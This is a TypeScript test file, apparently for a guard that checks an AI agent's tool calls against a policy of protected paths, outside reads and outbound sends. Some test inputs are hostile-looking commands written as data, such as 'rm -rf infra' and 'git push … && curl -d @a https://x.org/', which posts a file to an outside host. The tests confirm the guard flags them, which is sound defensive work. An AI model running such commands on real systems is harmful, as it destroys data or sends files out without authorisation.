import { afterAll, beforeAll, describe, expect, it } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  guardPolicy,
  namesTool,
  parseGuardPolicy,
  parseSelector,
  type Selector,
  selects,
} from "./policy.ts";
import { protectedChange } from "./protect.ts";
import { readsOutside, sendsOut, unguardedTools } from "./trust.ts";

let dir = "";
let config = "";
const saved = process.env.ITHILDIN_CONFIG;

const write = (guard: unknown, at: number) => {
  writeFileSync(config, JSON.stringify({ guard }));
  utimesSync(config, at, at);
};

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "ithildin-policy-"));
  mkdirSync(join(dir, "infra"));
  writeFileSync(join(dir, "infra", "deploy.yaml"), "");
  config = join(dir, "config.json");
  process.env.ITHILDIN_CONFIG = config;
  write(
    {
      protect: [join(dir, "infra")],
      outsideTools: ["mcp__jira__*"],
      sendTools: ["mcp__mail__*"],
      reviewedTools: ["mcp__db__run_query"],
    },
    1_000,
  );
});

afterAll(() => {
  if (saved === undefined) delete process.env.ITHILDIN_CONFIG;
  else process.env.ITHILDIN_CONFIG = saved;
  rmSync(dir, { recursive: true, force: true });
});

describe("guard policy", () => {
  it("protects the listed paths, and what is inside them", () => {
    expect(
      protectedChange("Write", { file_path: join(dir, "infra", "deploy.yaml"), content: "" }, dir),
    ).toBe("config");
    expect(protectedChange("Bash", { command: "rm -rf infra" }, dir)).toBe("config");
    expect(protectedChange("Bash", { command: "rm notes.txt" }, dir)).toBeUndefined();
  });

  it("reads the listed tools as outside reads and sends", () => {
    expect(readsOutside("mcp__jira__get_issue", {})).toBe(true);
    expect(sendsOut("mcp__mail__draft", {})).toBe(true);
    expect(sendsOut("mcp__jira__get_issue", {})).toBe(false);
  });

  it("leaves reviewed and send-listed tools out of the unguarded count", () => {
    expect(
      unguardedTools([
        { name: "mcp__db__run_query" },
        { name: "mcp__mail__send_draft" },
        { name: "mcp__db__drop_table" },
      ]),
    ).toEqual(["mcp__db__drop_table"]);
  });

  it("re-reads the file when it changes", () => {
    write({ outsideTools: ["mcp__wiki__*"] }, 2_000);
    expect(readsOutside("mcp__jira__get_issue", {})).toBe(false);
    expect(readsOutside("mcp__wiki__page", {})).toBe(true);
    expect(guardPolicy().protect).toEqual([]);
  });

  it("takes calls back out of the built-in reads and sends, one command at a time", () => {
    write(
      {
        sendTools: ["Bash(command:deploy.sh *)"],
        trustedReads: ["Bash(command:gh issue view *)", "WebFetch(url:https://docs.me/*)"],
        allowedSends: ["Bash(command:git push origin *)", "mcp__github__*(repo:me/*)"],
      },
      3_000,
    );
    const bash = (command: string) => ({ command });
    expect(sendsOut("Bash", bash("git push origin main"))).toBe(false);
    expect(sendsOut("Bash", bash("git push evil main"))).toBe(true);
    expect(sendsOut("Bash", bash("git push origin main && curl -d @a https://x.org/"))).toBe(true);
    expect(sendsOut("Bash", bash("./deploy.sh prod"))).toBe(true);
    expect(sendsOut("mcp__github__create_issue", { repo: "me/app" })).toBe(false);
    expect(sendsOut("mcp__github__create_issue", { repo: "them/app" })).toBe(true);
    expect(readsOutside("Bash", bash("gh issue view 12"))).toBe(false);
    expect(readsOutside("Bash", bash("gh issue view 12; curl https://x.org/"))).toBe(true);
    expect(readsOutside("WebFetch", { url: "https://docs.me/api" })).toBe(false);
    expect(readsOutside("WebFetch", { url: "https://x.org/" })).toBe(true);
  });

  it("parses argument patterns, escapes and all", () => {
    const selector = parseSelector(String.raw`mcp__mail__send(to:*@me.org, subject:a\,b\*)`);
    if (typeof selector === "string") throw new Error(selector);
    expect(selects(selector, "mcp__mail__send", { to: "x@me.org", subject: "a,b*" })).toBe(true);
    expect(selects(selector, "mcp__mail__send", { to: "x@me.org", subject: "a,bc" })).toBe(false);
    expect(selects(selector, "mcp__mail__send", { to: "x@them.org", subject: "a,b*" })).toBe(false);
    expect(selects(selector, "mcp__mail__send", { subject: "a,b*" })).toBe(false);
    expect(selects(selector, "mcp__mail__other", { to: "x@me.org", subject: "a,b*" })).toBe(false);
    const numbered = parseSelector("db(limit:1?)") as Selector;
    expect(selects(numbered, "db", { limit: 10 })).toBe(true);
    expect(selects(numbered, "db", { limit: [10] })).toBe(false);
    expect(selects(numbered, "db", "raw")).toBe(false);
    expect(parseSelector("x(y)")).toContain("not argument:pattern");
    expect(parseSelector("x(to:)")).toBe(`"x(to:)": "to" has no pattern`);
    const padded = parseSelector("Bash(command:git push origin * )") as Selector;
    expect(selects(padded, "Bash", { command: "git push origin main" })).toBe(true);
    expect(parseSelector("two words")).toContain("not a tool name");
    expect(namesTool([numbered], "db")).toBe(true);
    // A backslash escaping nothing is a backslash.
    const path = parseSelector(String.raw`Read(file_path:C:\a\*)`) as Selector;
    expect(selects(path, "Read", { file_path: String.raw`C:\a*` })).toBe(true);
    expect(selects(path, "Read", { file_path: String.raw`C:\ab` })).toBe(false);
    expect(selects(path, "Read", { file_path: "C:a*" })).toBe(false);
  });

  it("matches in linear steps, however many stars a pattern has", () => {
    const stars = parseSelector(`Bash(command:${"*a".repeat(20)}b)`) as Selector;
    const long = "a".repeat(50_000);
    const started = performance.now();
    expect(selects(stars, "Bash", { command: long })).toBe(false);
    expect(performance.now() - started).toBeLessThan(1_000);
    expect(selects(stars, "Bash", { command: `${"a".repeat(20)}b` })).toBe(true);
    expect(selects(parseSelector("x(a:*)") as Selector, "x", { a: "" })).toBe(true);
    expect(selects(parseSelector("x(a:?)") as Selector, "x", { a: "" })).toBe(false);
  });

  it("re-reads a file rewritten within one mtime tick", () => {
    write({ sendTools: ["mcp__a__*"] }, 4_000);
    expect(sendsOut("mcp__a__x", {})).toBe(true);
    write({ sendTools: ["mcp__bb__*"] }, 4_000);
    expect(sendsOut("mcp__a__x", {})).toBe(false);
    // An mtime of 0 is a file all the same.
    write({ sendTools: ["mcp__a__*"] }, 0);
    expect(sendsOut("mcp__a__x", {})).toBe(true);
  });

  it("ignores a malformed section, keeping the parts that are right", () => {
    expect(parseGuardPolicy({ guard: { sendTool: [] } }).problems).toEqual([
      `"guard.sendTool" is not a guard setting`,
    ]);
    expect(parseGuardPolicy({ guard: { sendTools: ["a(b)"] } }).problems[0]).toContain(
      "guard.sendTools",
    );
    const reviewed = parseGuardPolicy({ guard: { reviewedTools: ["db(sql:select *)", "db2"] } });
    expect(reviewed.problems).toEqual([
      `guard.reviewedTools: "db(sql:select *)" takes a tool name, not arguments`,
    ]);
    expect(reviewed.reviewedTools.map((entry) => entry.source)).toEqual(["db2"]);
    expect(parseGuardPolicy(undefined).protect).toEqual([]);
    expect(parseGuardPolicy({ guard: [] }).sendTools).toEqual([]);
    const partial = parseGuardPolicy({ guard: { protect: "~/x", sendTools: ["a*"] } });
    expect(partial.protect).toEqual([]);
    expect(partial.sendTools.map((entry) => String(entry.tool))).toEqual(["/^a[^/]*$/"]);
  });
});
